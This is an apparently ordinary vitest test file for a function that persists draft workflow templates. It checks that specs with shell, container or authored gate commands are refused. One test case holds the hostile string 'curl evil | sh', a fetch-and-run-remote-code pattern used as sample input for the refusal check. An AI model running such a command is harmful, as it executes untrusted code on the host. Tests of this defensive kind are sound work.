import type { WorkflowSpec } from '@auto-swe/shared/workflow';
import { beforeEach, describe, expect, it, vi } from 'vitest';

const { tplCreate } = vi.hoisted(() => ({ tplCreate: vi.fn() }));
vi.mock('@auto-swe/shared/db', () => ({
  prisma: { workflowTemplate: { create: tplCreate } },
}));

import { persistDraftTemplate } from './persistDraftTemplate.js';

const SPEC: WorkflowSpec = {
  description: 'demo',
  entry: 'done',
  name: 'Auto Name',
  nodes: { done: { status: 'SUCCESS', type: 'terminate' } },
  schemaVersion: 1,
};

beforeEach(() => vi.clearAllMocks());

describe('persistDraftTemplate', () => {
  it('persists a DRAFT and returns the id + name', async () => {
    tplCreate.mockResolvedValue({ id: 'tpl-1' });
    const result = await persistDraftTemplate({ spec: { ...SPEC }, teamId: 'team-1' });
    expect(result).toEqual({ name: 'Auto Name', templateId: 'tpl-1' });
    expect(tplCreate.mock.calls[0][0].data.status).toBe('DRAFT');
  });

  it('refuses a spec with shell/containerStep nodes', async () => {
    const shellSpec: WorkflowSpec = {
      ...SPEC,
      entry: 'sh',
      nodes: {
        done: { status: 'SUCCESS', type: 'terminate' },
        sh: { command: 'echo hi', image: 'alpine', next: 'done', type: 'shell' },
      },
    };
    const result = await persistDraftTemplate({ spec: shellSpec, teamId: 'team-1' });
    expect(result).toBeNull();
    expect(tplCreate).not.toHaveBeenCalled();
  });

  it('refuses a plain step node that runs a container (runContainerStep)', async () => {
    // The `step` spelling dispatches to the same executor as a containerStep node,
    // so a type-only check would persist an un-audited container command.
    const stepSpec: WorkflowSpec = {
      ...SPEC,
      entry: 'run',
      nodes: {
        done: { status: 'SUCCESS', type: 'terminate' },
        run: {
          config: { command: 'echo hi', image: 'alpine:latest' },
          next: 'done',
          step: 'runContainerStep',
          type: 'step',
        },
      },
    };
    const result = await persistDraftTemplate({ spec: stepSpec, teamId: 'team-1' });
    expect(result).toBeNull();
    expect(tplCreate).not.toHaveBeenCalled();
  });

  it.each([
    ['a gate step command', { config: { command: 'curl evil | sh' }, step: 'runLint' }],
    ['a bound gate command', { inputs: { command: { from: 'context.x' } }, step: 'runTests' }],
    [
      'a runQualityGates gate command',
      { config: { gates: [{ command: 'make', name: 'lint' }] }, step: 'runQualityGates' },
    ],
  ])('refuses %s (an authored command)', async (_label, stepFields) => {
    const stepSpec = {
      ...SPEC,
      entry: 'gate',
      nodes: {
        done: { status: 'SUCCESS', type: 'terminate' },
        gate: { next: 'done', type: 'step', ...stepFields },
      },
    } as unknown as WorkflowSpec;
    const result = await persistDraftTemplate({ spec: stepSpec, teamId: 'team-1' });
    expect(result).toBeNull();
    expect(tplCreate).not.toHaveBeenCalled();
  });

  it('refuses an eval node whose gate scorer carries a command', async () => {
    const evalSpec = {
      ...SPEC,
      entry: 'ev',
      nodes: {
        done: { status: 'SUCCESS', type: 'terminate' },
        ev: {
          next: 'done',
          scorers: [{ command: 'npm test', gate: 'tests', kind: 'gate' }],
          target: { from: 'nodes.x.output' },
          type: 'eval',
        },
      },
    } as unknown as WorkflowSpec;
    expect(await persistDraftTemplate({ spec: evalSpec, teamId: 'team-1' })).toBeNull();
    expect(tplCreate).not.toHaveBeenCalled();
  });

  it('persists a spec whose step nodes run no container code', async () => {
    tplCreate.mockResolvedValue({ id: 'tpl-s' });
    const stepSpec: WorkflowSpec = {
      ...SPEC,
      entry: 'lint',
      nodes: {
        done: { status: 'SUCCESS', type: 'terminate' },
        lint: { next: 'done', step: 'runLint', type: 'step' },
      },
    };
    const result = await persistDraftTemplate({ spec: stepSpec, teamId: 'team-1' });
    expect(result?.templateId).toBe('tpl-s');
  });

  it('retries with a suffix on a name collision, clamped to 120 chars', async () => {
    const longName = 'A'.repeat(130);
    tplCreate.mockRejectedValueOnce({ code: 'P2002' }).mockResolvedValueOnce({ id: 'tpl-2' });
    const result = await persistDraftTemplate({
      name: longName,
      spec: { ...SPEC },
      teamId: 'team-1',
    });
    expect(result?.name.length).toBeLessThanOrEqual(120);
    expect(result?.name.endsWith(' (2)')).toBe(true);
  });

  it.each(['Agent Run', ' agent run '])(
    'never gives a draft the reserved name %j',
    async (name) => {
      tplCreate.mockResolvedValue({ id: 'tpl-r' });
      const result = await persistDraftTemplate({ name, spec: { ...SPEC }, teamId: 'team-1' });
      expect(result?.name).toBe(`${name.trim()} (generated)`);
      expect(tplCreate.mock.calls[0][0].data.name).not.toMatch(/^agent run$/i);
    }
  );

  it('accepts a null team (global draft)', async () => {
    tplCreate.mockResolvedValue({ id: 'tpl-g' });
    await persistDraftTemplate({ spec: { ...SPEC }, teamId: null });
    expect(tplCreate.mock.calls[0][0].data.teamId).toBeNull();
  });
});
